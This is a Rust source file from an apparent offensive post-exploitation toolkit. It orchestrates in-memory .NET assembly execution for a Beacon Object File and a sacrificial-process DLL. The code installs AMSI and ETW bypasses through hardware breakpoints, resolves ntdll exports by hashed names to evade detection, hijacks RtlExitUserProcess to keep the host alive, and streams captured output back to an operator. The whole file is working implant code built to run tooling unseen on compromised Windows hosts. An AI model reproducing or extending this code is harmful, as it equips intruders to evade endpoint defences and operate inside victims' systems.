//! Shared CLR-hosting orchestrator used by both `senjata-execute-assembly`
//! (BOF, inline mode) and `senjata-runner` (postex DLL, sacrificial mode).
#![no_std]

extern crate alloc;


#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub use error::OrchestratorError;

pub mod pe_parser;

#[cfg(target_os = "windows")]
pub mod io;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod dispatch;
#[cfg(target_os = "windows")]
pub mod netfx;
#[cfg(target_os = "windows")]
pub mod coreclr;
#[cfg(target_os = "windows")]
pub mod flush;
#[cfg(target_os = "windows")]
pub mod nlog;
#[cfg(target_os = "windows")]
pub mod bypasses;

/// Optional diagnostic logger. When `Some`, orchestrate calls it at
/// each major step so the caller can write to its own diagnostic sink.
/// The BOF passes `None`; the postex DLL passes a wrapper around
/// `senjata_runner::debug_log::log` for the v0.3.x debugging phase.
#[cfg(target_os = "windows")]
pub type DiagLogFn = unsafe extern "C" fn(msg: *const u8, len: usize);

/// Parsed-args bag passed to `orchestrate`. Both the BOF (inline mode)
/// and the postex DLL (sacrificial mode) parse their wire-format args
/// into this struct after parsing. Borrows live for the duration of the
/// `orchestrate` call — the underlying arg blob must outlive the call.
#[cfg(target_os = "windows")]
pub struct OrchestrateInput<'a> {
    pub app_domain: &'a str,
    pub amsi: bool,
    pub etw: bool,
    pub mailslot: bool,
    pub entry_point: u32,
    pub slot_name: &'a str,
    pub pipe_name: &'a str,
    pub asm_args: &'a str,
    pub mode: u32,
    pub main_name: &'a str,
    pub asm_bytes: &'a [u8],
    /// Optional diagnostic logger (see `DiagLogFn`).
    pub log_fn: Option<DiagLogFn>,
}

/// Internal: emit `msg` via the caller-supplied logger if set. No-op in
/// production builds (the diagnostic infrastructure is retained behind
/// a Cargo feature in the runner crate so future debugging can re-enable
/// it without re-deriving the instrumentation).
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
#[inline]
fn dlog(input: &OrchestrateInput<'_>, msg: &[u8]) {
    if let Some(f) = input.log_fn {
        unsafe { f(msg.as_ptr(), msg.len()) };
    }
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
fn dlog(_input: &OrchestrateInput<'_>, _msg: &[u8]) {}

/// Crate-global diagnostic logger. orchestrate_internal stashes the
/// caller's log_fn here so dispatch / netfx / nlog / flush modules can
/// emit trace lines without threading the callback through every fn
/// signature.
///
/// Compiled out when the `diag-log` feature is off.
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
static DLOG_SLOT: core::sync::atomic::AtomicUsize =
    core::sync::atomic::AtomicUsize::new(0);

#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
fn set_dlog(f: Option<DiagLogFn>) {
    let v = match f {
        Some(g) => g as usize,
        None => 0,
    };
    DLOG_SLOT.store(v, core::sync::atomic::Ordering::Relaxed);
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
fn set_dlog(_f: Option<DiagLogFn>) {}

/// Available to any module in this crate: emit `msg` if the orchestrate
/// caller wired a logger. Cheap no-op when not wired (and entirely
/// optimised out under `not(feature = "diag-log")`).
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
pub(crate) fn dlog2(msg: &[u8]) {
    let v = DLOG_SLOT.load(core::sync::atomic::Ordering::Relaxed);
    if v != 0 {
        let f: DiagLogFn = unsafe { core::mem::transmute(v) };
        unsafe { f(msg.as_ptr(), msg.len()) };
    }
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
pub(crate) fn dlog2(_msg: &[u8]) {}

/// Emit `label` followed by a hex-formatted u32 (e.g. "label 0xdeadbeef\n").
#[cfg(target_os = "windows")]
#[cfg(feature = "diag-log")]
pub(crate) fn dlog2_hex(label: &[u8], value: u32) {
    let v = DLOG_SLOT.load(core::sync::atomic::Ordering::Relaxed);
    if v == 0 {
        return;
    }
    let f: DiagLogFn = unsafe { core::mem::transmute(v) };
    // Format `label 0xXXXXXXXX` into a stack buffer.
    let mut buf = [0u8; 80];
    let mut i = 0;
    for &b in label {
        if i >= buf.len() { break; }
        buf[i] = b;
        i += 1;
    }
    if i + 11 < buf.len() {
        buf[i] = b' '; i += 1;
        buf[i] = b'0'; i += 1;
        buf[i] = b'x'; i += 1;
        for shift in (0..32).step_by(4).rev() {
            let nibble = ((value >> shift) & 0xF) as u8;
            buf[i] = if nibble < 10 { b'0' + nibble } else { b'a' + (nibble - 10) };
            i += 1;
        }
    }
    unsafe { f(buf.as_ptr(), i) };
}

#[cfg(target_os = "windows")]
#[cfg(not(feature = "diag-log"))]
#[inline(always)]
pub(crate) fn dlog2_hex(_label: &[u8], _value: u32) {}

/// Caller-supplied hook for streaming mode: receives the pipe-read HANDLE
/// before the CLR begins writing. Caller is expected to spawn a thread
/// that reads from this handle and forwards bytes to operator.
///
/// `ctx` is an opaque pointer threaded through unchanged — typically a
/// reference to the caller's BeaconAPI struct.
#[cfg(target_os = "windows")]
pub type PipeReadyHook = unsafe extern "C" fn(
    read_handle: windows_sys::Win32::Foundation::HANDLE,
    ctx: *mut core::ffi::c_void,
);

/// Inline-mode orchestrate. Drains the pipe at end-of-run into a String
/// and prints once via `rustbof::eprintln`. Used by the BOF.
///
/// # Safety
///
/// Caller must guarantee:
/// - PEB walker (`opsec_peb`) is in a valid state. No explicit init is
///   required; PEB is process-global.
/// - `engine: &HwbpEngine` is freshly initialized via `HwbpEngine::init()`
///   on the calling thread and stays alive for the duration of the call.
///   The engine installs HWBP descriptors on threads as needed; do not
///   share one engine across BOF/runner instances.
/// - `input.asm_bytes` outlives the call and is a valid managed PE (single-
///   file mode) or a valid multi-file blob (mode == 1; see
///   `netfx::parse_multi_blob` for the layout).
/// - Single-threaded entry. The orchestrator installs and removes HWBP
///   descriptors via indirect syscalls; concurrent entry from another
///   thread of the same process would race on the engine state.
/// - The host process can tolerate `Console.Out` redirection — for the
///   BOF this means Beacon's process, for the postex DLL it's a fresh
///   sacrificial.
///
/// On `Environment.Exit` inside the managed code, the exit-trap rewrites
/// RIP/RSP back to the cleanup point captured before dispatch; the
/// function then drains any remaining output and returns `Ok(())`.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
) -> Result<(), OrchestratorError> {
    unsafe { orchestrate_internal(input, engine, None, core::ptr::null_mut()) }
}

/// Sacrificial-mode orchestrate. Invokes `hook(read_handle, ctx)` once,
/// immediately after the internal pipe is opened, so the caller can spawn
/// a reader thread before the CLR starts writing. NO end-of-run drain;
/// the streamer drains to EOF (signalled by `IoChannel::drop` closing
/// the write end).
///
/// # Safety
/// Same as `orchestrate`. Additionally, `ctx` must outlive the call.
/// Hook is called exactly once, before dispatch.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate_streaming(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
    hook: PipeReadyHook,
    ctx: *mut core::ffi::c_void,
) -> Result<(), OrchestratorError> {
    unsafe { orchestrate_internal(input, engine, Some(hook), ctx) }
}

#[cfg(target_os = "windows")]
unsafe fn orchestrate_internal(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
    hook: Option<PipeReadyHook>,
    ctx: *mut core::ffi::c_void,
) -> Result<(), OrchestratorError> {
    unsafe {
        // Make the log fn available crate-wide for the duration of this call.
        set_dlog(input.log_fn);
        dlog(input, b"[orch] entered");

        // PE parser → runtime detection (single-file mode only; multi-file
        // mode trusts the caller-bundled blob).
        dlog(input, b"[orch] pe_parser::parse");
        let asm_info = if input.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(input.asm_bytes).map_err(|e| match e {
                pe_parser::Error::MixedMode => OrchestratorError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => OrchestratorError::ArchMismatch,
                other => OrchestratorError::PeParse(other),
            })?
        };
        dlog(input, b"[orch]   pe_parser ok");

        // Install ETW / AMSI / AllocConsole HWBP bypasses.
        dlog(input, b"[orch] bypasses::install");
        let _bypasses = bypasses::install(engine, input.amsi, input.etw)?;
        dlog(input, b"[orch]   bypasses ok");

        // Open the output channel BEFORE the CLR initializes stdio.
        dlog(input, b"[orch] IoChannel::open");
        let mut io_ch = io::IoChannel::open(input.mailslot, input.slot_name, input.pipe_name)?;
        dlog(input, b"[orch]   IoChannel ok");

        // Streaming mode: hand the read handle to the caller, exactly once,
        // before the CLR starts writing.
        let streaming = hook.is_some();
        if let Some(h) = hook {
            dlog(input, b"[orch] calling pipe_ready_hook");
            h(io_ch.read_handle(), ctx);
            dlog(input, b"[orch]   pipe_ready_hook returned");
        }

        // Capture the cleanup point for the exit-trap (re-entry after
        // Environment.Exit). The trap is installed below before dispatch.
        dlog(input, b"[orch] save_cleanup_point");
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        dlog(input, b"[orch]   cleanup point saved");
        // Two paths land here:
        //   A. First entry: dispatch the assembly, then drain.
        //   B. Re-entry from RtlExitUserProcess exit-trap: dispatch_result?
        //      unwound via the cleanup-RIP/RSP rewrite; we resume here for
        //      a final drain.
        // Path A executes the dispatch block; path B falls through to the
        // trailing drain.
        {
            // Install the exit-trap on RtlExitUserProcess (slot 2).
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(OrchestratorError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exit_h,
                })?;
            dlog(input, b"[orch] install_exit_trap");
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(OrchestratorError::Hwbp)?;
            dlog(input, b"[orch]   exit_trap installed");

            dlog(input, b"[orch] dispatch::dispatch");
            let dispatch_result = dispatch::dispatch(
                &asm_info,
                input.asm_bytes,
                input.app_domain,
                input.asm_args,
                input.entry_point,
                input.mode,
                input.main_name,
                io_ch.write_handle() as usize,
            );
            dlog(input, b"[orch]   dispatch returned");

            dlog(input, b"[orch] (about to leave inner block; exit_trap will drop)");

            // Path A: assembly Main returned normally.
            #[cfg(feature = "debug-io")]
            io_ch.diag_write(b"\n[RUST_END]\n");
            // Inline mode: drain the pipe and emit via BeaconOutput.
            // Streaming mode: the caller's reader thread is already
            // draining; we just let `io_ch.drop` close the write end at
            // function exit so the streamer observes ERROR_BROKEN_PIPE.
            if !streaming {
                if let Ok(output) = io_ch.drain() {
                    if !output.is_empty() {
                        rustbof::eprintln!("\n{}", output);
                    }
                }
            }
            dispatch_result?;
        }
        dlog(input, b"[orch] inner block exited (exit_trap dropped)");
        // Trailing drain — covers path B (no-op for path A, which already
        // drained). Streaming mode skips entirely; the reader thread sees
        // EOF when this function returns and `io_ch` is dropped.
        if !streaming {
            if let Ok(output) = io_ch.drain() {
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
        }
        dlog(input, b"[orch] about to return Ok (io_ch + bypasses will Drop)");
        Ok(())
    }
}
